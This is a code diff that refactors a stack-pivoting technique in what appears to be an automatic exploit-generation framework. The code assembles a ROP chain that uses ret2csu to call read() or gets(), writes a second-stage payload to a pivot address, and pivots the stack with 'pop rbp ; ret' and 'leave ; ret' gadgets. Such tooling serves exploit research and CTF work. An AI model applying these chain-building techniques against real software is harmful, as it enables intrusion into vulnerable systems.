@@ -60,23 +60,18 @@ std::vector<RopPayload> BasicStackPivoting::getRopPayloadList() const {
     auto ret2csu = g_crax->getTechnique<Ret2csu>();
     assert(ret2csu);
 
-    // RBP
-    RopPayload part1 = {
-        ConstantExpr::create(0, Expr::Int64)
-    };
-
     // Write the 2nd stage ROP payload via read() or gets() to `pivot_dest`.
-    RopPayload part2;
+    RopPayload part1;
 
     if (elf.hasSymbol("read")) {
-        part2 = ret2csu->getRopPayloadList(
+        part1 = ret2csu->getRopPayloadList(
                 BaseOffsetExpr::create<BaseType::SYM>(elf, "read"),
                 ConstantExpr::create(0, Expr::Int64),
                 BaseOffsetExpr::create<BaseType::VAR>(elf, "pivot_dest"),
                 ConstantExpr::create(1024, Expr::Int64))[0];
 
     } else if (elf.hasSymbol("gets")) {
-        part2 = ret2csu->getRopPayloadList(
+        part1 = ret2csu->getRopPayloadList(
                 BaseOffsetExpr::create<BaseType::SYM>(elf, "gets"),
                 BaseOffsetExpr::create<BaseType::VAR>(elf, "pivot_dest"),
                 ConstantExpr::create(0, Expr::Int64),
@@ -84,17 +79,17 @@ std::vector<RopPayload> BasicStackPivoting::getRopPayloadList() const {
     }
 
     // Perform stack pivoting.
-    RopPayload part3 = {
+    RopPayload part2 = {
         BaseOffsetExpr::create<BaseType::VAR>(elf, Exploit::toVarName(elf, "pop rbp ; ret")),
         BaseOffsetExpr::create<BaseType::VAR>(elf, "pivot_dest"),
         BaseOffsetExpr::create<BaseType::VAR>(elf, Exploit::toVarName(elf, "leave ; ret"))
     };
 
     RopPayload ret;
-    ret.reserve(part1.size() + part2.size() + part3.size());
+    ret.reserve(1 + part1.size() + part2.size());
+    ret.push_back(ConstantExpr::create(0, Expr::Int64));  // RBP
     ret.insert(ret.end(), part1.begin(), part1.end());
     ret.insert(ret.end(), part2.begin(), part2.end());
-    ret.insert(ret.end(), part3.begin(), part3.end());
     return { ret };
 }
 
